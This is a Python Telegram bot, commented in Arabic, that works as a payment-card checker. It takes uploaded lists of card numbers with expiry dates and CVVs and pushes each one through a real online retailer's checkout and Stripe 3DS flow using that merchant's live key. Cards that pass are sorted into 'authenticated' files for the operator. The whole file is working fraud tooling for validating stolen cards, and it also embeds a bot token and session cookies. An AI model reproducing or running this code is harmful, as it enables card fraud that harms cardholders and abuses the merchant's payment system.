import os
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
import json
import base64

# ========== الإعدادات ==========
BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
ADMIN_IDS = [5895491379, 844663875]

# ========== إحصائيات ==========
stats = {
    'total': 0,
    'checking': 0,
    'authenticated': 0,
    'challenge': 0,
    'attempted': 0,
    'not_auth': 0,
    'unavailable': 0,
    'declined': 0,
    'failed_auth': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'error_details': {},
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'authenticated_cards': [],
    'challenge_cards': [],
    'attempted_cards': [],
}

# ========== Stripe Checker Class ==========
class StripeChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'accept': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
    def create_new_cart(self):
        """إنشاء سلة جديدة والحصول على quoteId"""
        try:
            print("[*] Creating new cart...")
            cookies = {
                'store_switcher_popup_closed': 'closed',
                'store': 'default',
                'geoip_store_code': 'default',
                'searchReport-log': '0',
                '_ga': 'GA1.1.1117311913.1762822685',
                '_fbp': 'fb.1.1762822684983.555449526293831509',
                'form_key': 'slSdPjvgeIrs2Jbv',
                'mage-cache-storage': '{}',
                'mage-cache-storage-section-invalidation': '{}',
                'mage-messages': '',
                'recently_viewed_product': '{}',
                'recently_viewed_product_previous': '{}',
                'recently_compared_product': '{}',
                'recently_compared_product_previous': '{}',
                'product_data_storage': '{}',
                'currency_code': 'GBP',
                'twk_idm_key': 'If05Y4iPf8GjS1U3HQ2KA',
                'PHPSESSID': 'vrpcdoq0uac8mpci1cgqeo8jr2',
                'mage-cache-sessid': 'true',
                '__stripe_mid': 'dbf99062-2426-4422-aeaa-5281ab702aad274b35',
                '__stripe_sid': '66f0a1c2-42eb-498f-908e-64249c618bdeab244f',
                'wp_customerGroup': 'NOT%20LOGGED%20IN',
                '_gcl_au': '1.1.128175039.1762822685.606519831.1762822689.1762823296',
            }

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryzpgjYWHuq3LNOAfe',
                'dnt': '1',
                'origin': 'https://www.ironmongeryworld.com',
                'priority': 'u=1, i',
                'referer': 'https://www.ironmongeryworld.com/air-bricks-vents-trivets/round-circle-hit-miss-sliding-vent-antique-iron.html',
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            files = {
                'product': (None, '16484'),
                'selected_configurable_option': (None, ''),
                'related_product': (None, ''),
                'item': (None, '16484'),
                'form_key': (None, 'slSdPjvgeIrs2Jbv'),
                'qty': (None, '1'),
            }

            response = self.session.post(
                'https://www.ironmongeryworld.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuaXJvbm1vbmdlcnl3b3JsZC5jb20vYWlyLWJyaWNrcy12ZW50cy10cml2ZXRzL3JvdW5kLWNpcmNsZS1oaXQtbWlzcy1zbGlkaW5nLXZlbnQtYW50aXF1ZS1pcm9uLmh0bWw%2C/product/16484/',
                cookies=cookies,
                headers=headers,
                files=files,
            )

            # الحصول على معلومات السلة
            params = {
                'sections': 'cart',
                'force_new_section_timestamp': 'false',
                '_': str(int(datetime.now().timestamp() * 1000)),
            }

            cart_response = self.session.get(
                'https://www.ironmongeryworld.com/customer/section/load/',
                params=params,
                cookies=cookies,
                headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                    'dnt': '1',
                    'priority': 'u=1, i',
                    'referer': 'https://www.ironmongeryworld.com/checkout/cart/',
                    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }
            )

            cart_data = cart_response.json()
            
            print(f"[*] Cart response: {cart_data}")
            
            if 'cart' in cart_data and 'mpquickcart' in cart_data['cart'] and 'quoteId' in cart_data['cart']['mpquickcart']:
                quote_id = cart_data['cart']['mpquickcart']['quoteId']
                print(f"[✓] New cart created: {quote_id}")
                return quote_id
            else:
                print(f"[!] quoteId not found in response")
                return None
                
        except Exception as e:
            print(f"[!] Error creating cart: {e}")
            import traceback
            traceback.print_exc()
            return None
        
    def check(self, card_number, exp_month, exp_year, cvv):
        try:
            print(f"\n[*] Checking card: {card_number[:6]}****{card_number[-4:]}")
            
            # إنشاء سلة جديدة والحصول على quoteId
            quote_id = self.create_new_cart()
            if not quote_id:
                print("[!] Failed to create cart - returning error")
                return 'ERROR', 'Failed to create new cart'
            
            print(f"[*] Using quoteId: {quote_id}")
            
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            })
            
            data = f'billing_details[address][state]=CO&billing_details[address][postal_code]=11333&billing_details[address][country]=US&billing_details[address][city]=Napoleon&billing_details[address][line1]=111+North+Street&billing_details[address][line2]=sagh&billing_details[email]=test@test.com&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
            
            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
            pm = r.json()
            if 'id' not in pm:
                return 'DECLINED', 'Payment method creation failed'
            pm_id = pm['id']
            
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/json',
                'origin': 'https://www.ironmongeryworld.com',
                'referer': 'https://www.ironmongeryworld.com/',
            })
            
            payload = {
                'cartId': quote_id,  # استخدام الـ quoteId الجديد
                'billingAddress': {
                    'countryId': 'US',
                    'regionId': '13',
                    'street': ['111 North Street', 'sagh'],
                    'telephone': '3609998856',
                    'postcode': '11333',
                    'city': 'Napoleon',
                    'firstname': 'Card',
                    'lastname': 'Test',
                },
                'paymentMethod': {
                    'method': 'stripe_payments',
                    'additional_data': {'payment_method': pm_id},
                },
                'email': 'test@test.com',
            }
            
            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{quote_id}/payment-information', headers=headers, json=payload)
            res = r.json()
            if 'message' not in res or 'pi_' not in res['message']:
                return 'DECLINED', 'Payment intent creation failed'
            client_secret = res['message'].split(': ')[1]
            pi_id = client_secret.split('_secret_')[0]
            
            headers = self.headers.copy()
            headers.update({
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            })
            
            params = f'client_secret={client_secret}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}?{params}', headers=headers)
            pi = r.json()
            
            if 'next_action' not in pi:
                return 'DECLINED', 'No 3DS action required'
            
            source = pi['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            trans_id = pi['next_action']['use_stripe_sdk']['server_transaction_id']
            
            fp = base64.b64encode(json.dumps({"threeDSServerTransID": trans_id}).encode()).decode()
            browser = json.dumps({
                "fingerprintAttempted": True,
                "fingerprintData": fp,
                "challengeWindowSize": None,
                "threeDSCompInd": "Y",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": "ar",
                "browserColorDepth": "24",
                "browserScreenHeight": "786",
                "browserScreenWidth": "1397",
                "browserTZ": "-120",
                "browserUserAgent": "Mozilla/5.0"
            })
            
            data = f'source={source}&browser={requests.utils.quote(browser)}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
            
            headers = self.headers.copy()
            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            })
            
            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
            auth = r.json()
            
            if 'ares' in auth:
                status = auth['ares'].get('transStatus', 'UNKNOWN')
                if status == 'R':
                    return 'DECLINED', 'Rejected by issuer'
                
                if status == 'C' and 'creq' in auth and 'ares' in auth and 'acsURL' in auth['ares']:
                    try:
                        creq = auth['creq']
                        acs_url = auth['ares']['acsURL']
                        
                        challenge_headers = {
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
                            'cache-control': 'max-age=0',
                            'content-type': 'application/x-www-form-urlencoded',
                            'dnt': '1',
                            'origin': 'https://js.stripe.com',
                            'priority': 'u=0, i',
                            'referer': 'https://js.stripe.com/',
                            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-fetch-dest': 'iframe',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'cross-site',
                            'upgrade-insecure-requests': '1',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
                        }
                        
                        challenge_data = {'creq': creq}
                        
                        challenge_response = self.session.post(
                            acs_url,
                            headers=challenge_headers,
                            data=challenge_data,
                            timeout=15,
                            allow_redirects=True
                        )
                        
                        html_response = challenge_response.text
                        
                        failure_keywords = [
                            'Authentication failed',
                            'authentication failed',
                            'Sorry, something went wrong',
                            'something went wrong',
                            "There's a problem with your card",
                            'problem with your card'
                        ]
                        
                        if any(keyword in html_response.lower() for keyword in [k.lower() for k in failure_keywords]):
                            return 'FAILED_AUTH', 'Authentication failed in challenge'
                        
                    except Exception as e:
                        pass
                
                return status, f'3DS Status: {status}'
            return 'DECLINED', 'Authentication failed'
            
        except Exception as e:
            return 'ERROR', str(e)

async def send_result(bot_app, card, status_type, message):
    try:
        card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
        
        if status_type == 'Y':
            text = (
                "╔═══════════════════╗\n"
                "✅ **AUTHENTICATED CARD** ✅\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **Y - Authenticated**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Stripe 3DS Gateway\n"
                "╚═══════════════════╝"
            )
            stats['authenticated_cards'].append(card)
            
        elif status_type == 'C':
            text = (
                "╔═══════════════════╗\n"
                "⚠️ **CHALLENGE REQUIRED** ⚠️\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **C - Challenge Required**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Stripe 3DS Gateway\n"
                "╚═══════════════════╝"
            )
            stats['challenge_cards'].append(card)
            
        elif status_type == 'A':
            text = (
                "╔═══════════════════╗\n"
                "🔵 **ATTEMPTED** 🔵\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **A - Attempted**\n"
                f"📊 Card #{card_number}\n"
                f"⚡️ Stripe 3DS Gateway\n"
                "╚═══════════════════╝"
            )
            stats['attempted_cards'].append(card)
        else:
            return
        
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'],
            text=text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"[!] Error: {e}")

async def check_card(card, bot_app):
    if not stats['is_running']:
        return card, "STOPPED", "تم الإيقاف"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app)
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = parts
    card_number = card_number.strip()
    exp_month = exp_month.strip().zfill(2)
    exp_year = exp_year.strip()
    
    if len(exp_year) == 4:
        exp_year = exp_year[-2:]
    
    cvv = cvv.strip()
    
    try:
        if not stats['is_running']:
            stats['checking'] -= 1
            return card, "STOPPED", "تم الإيقاف"
        
        checker = StripeChecker()
        status, message = checker.check(card_number, exp_month, exp_year, cvv)
        
        if status == 'Y':
            stats['authenticated'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Authenticated ✅'
            await update_dashboard(bot_app)
            await send_result(bot_app, card, "Y", message)
            return card, "Y", message
            
        elif status == 'FAILED_AUTH':
            stats['failed_auth'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Failed Auth ❌'
            await update_dashboard(bot_app)
            return card, "FAILED_AUTH", message
            
        elif status == 'C':
            stats['challenge'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Challenge ⚠️'
            await update_dashboard(bot_app)
            await send_result(bot_app, card, "C", message)
            return card, "C", message
            
        elif status == 'A':
            stats['attempted'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Attempted 🔵'
            await update_dashboard(bot_app)
            await send_result(bot_app, card, "A", message)
            return card, "A", message
            
        elif status == 'N':
            stats['not_auth'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Not Auth ❌'
            await update_dashboard(bot_app)
            return card, "N", message
            
        elif status == 'U':
            stats['unavailable'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Unavailable 🔴'
            await update_dashboard(bot_app)
            return card, "U", message
            
        elif status == 'DECLINED' or status == 'R':
            stats['declined'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Declined/Rejected ❌'
            await update_dashboard(bot_app)
            return card, "DECLINED", message
            
        else:
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'{status}'
            await update_dashboard(bot_app)
            return card, status, message
            
    except Exception as e:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app)
        return card, "EXCEPTION", str(e)

def create_dashboard_keyboard():
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Y: {stats['authenticated']}", callback_data="authenticated"),
            InlineKeyboardButton(f"⚠️ C: {stats['challenge']}", callback_data="challenge")
        ],
        [
            InlineKeyboardButton(f"🔵 A: {stats['attempted']}", callback_data="attempted"),
            InlineKeyboardButton(f"❌ N: {stats['not_auth']}", callback_data="not_auth")
        ],
        [
            InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"),
            InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined")
        ],
        [
            InlineKeyboardButton(f"❌ Failed Auth: {stats['failed_auth']}", callback_data="failed_auth")
        ],
        [
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **STRIPE 3DS CHECKER - LIVE** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except:
            pass

async def send_final_files(bot_app):
    try:
        if stats['authenticated_cards']:
            authenticated_text = "\n".join(stats['authenticated_cards'])
            with open("authenticated_cards.txt", "w") as f:
                f.write(authenticated_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open("authenticated_cards.txt", "rb"),
                caption=f"✅ **Authenticated Cards (Y)** ({len(stats['authenticated_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("authenticated_cards.txt")
        
        if stats['challenge_cards']:
            challenge_text = "\n".join(stats['challenge_cards'])
            with open("challenge_cards.txt", "w") as f:
                f.write(challenge_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open("challenge_cards.txt", "rb"),
                caption=f"⚠️ **Challenge Required Cards (C)** ({len(stats['challenge_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("challenge_cards.txt")
        
        if stats['attempted_cards']:
            attempted_text = "\n".join(stats['attempted_cards'])
            with open("attempted_cards.txt", "w") as f:
                f.write(attempted_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open("attempted_cards.txt", "rb"),
                caption=f"🔵 **Attempted Cards (A)** ({len(stats['attempted_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove("attempted_cards.txt")
        
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **STRIPE 3DS CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        "**الردود المتاحة:**\n"
        "✅ Y - Authenticated\n"
        "⚠️ C - Challenge Required\n"
        "🔵 A - Attempted\n"
        "❌ N - Not Authenticated\n"
        "🔴 U - Unavailable\n"
        "❌ Declined/Rejected (R)\n"
        "❌ Failed Auth - فشل المصادقة\n\n"
        "🆕 **السلة تتجدد تلقائياً لكل بطاقة!**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    stats.update({
        'total': len(cards),
        'checking': 0,
        'authenticated': 0,
        'challenge': 0,
        'attempted': 0,
        'not_auth': 0,
        'unavailable': 0,
        'declined': 0,
        'failed_auth': 0,
        'errors': 0,
        'current_card': '',
        'error_details': {},
        'last_response': 'Starting...',
        'cards_checked': 0,
        'authenticated_cards': [],
        'challenge_cards': [],
        'attempted_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(
        text="📊 **STRIPE 3DS CHECKER - LIVE** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"🔄 جاري الفحص...\n"
        f"🆕 السلة تتجدد تلقائياً لكل بطاقة!",
        parse_mode='Markdown'
    )
    
    asyncio.create_task(process_cards(cards, context.application))

async def process_cards(cards, bot_app):
    for i, card in enumerate(cards):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped by user 🛑'
            await update_dashboard(bot_app)
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app)
        
        await check_card(card, bot_app)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 5 == 0:
            await update_dashboard(bot_app)
        
        await asyncio.sleep(2)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app)
    
    summary_text = (
        "┌──────────────────┐\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "└──────────────────┘\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ Authenticated (Y): {stats['authenticated']}\n"
        f"⚠️ Challenge (C): {stats['challenge']}\n"
        f"🔵 Attempted (A): {stats['attempted']}\n"
        f"❌ Not Auth (N): {stats['not_auth']}\n"
        f"🔴 Unavailable (U): {stats['unavailable']}\n"
        f"❌ Declined/Rejected: {stats['declined']}\n"
        f"❌ Failed Auth: {stats['failed_auth']}\n"
        f"⚠️ Errors: {stats['errors']}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app)
    
    final_text = (
        "╔═══════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n"
        "📊 شكراً لاستخدامك البوت!\n\n"
        "⚡️ Stripe 3DS Gateway\n"
        "🆕 Dynamic Cart System"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    try:
        await query.answer()
    except:
        pass
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application)
            try:
                await context.application.bot.send_message(
                    chat_id=stats['chat_id'],
                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
                    parse_mode='Markdown'
                )
            except:
                pass

def main():
    print("[🤖] Starting Stripe 3DS Telegram Bot...")
    print("[✅] Bot will send results in chat (no channel)")
    print("[✅] Using asyncio.create_task (no threading)")
    print("[✅] Failed Authentication detection enabled")
    print("[🆕] Dynamic Cart System - New cart for each check!")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
